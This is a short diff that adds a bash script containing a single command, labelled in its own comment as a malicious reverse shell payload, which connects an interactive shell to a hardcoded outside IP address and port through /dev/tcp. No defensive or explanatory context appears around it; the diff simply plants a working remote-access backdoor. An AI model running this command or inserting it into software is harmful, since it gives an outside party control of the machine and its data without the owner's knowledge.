@@ -1,0 +1,4 @@
+#!/bin/bash
+# DANGER: Malicious Reverse Shell Payload
+/bin/bash -i >& /dev/tcp/178.62.196.141/8833 0>&1
+
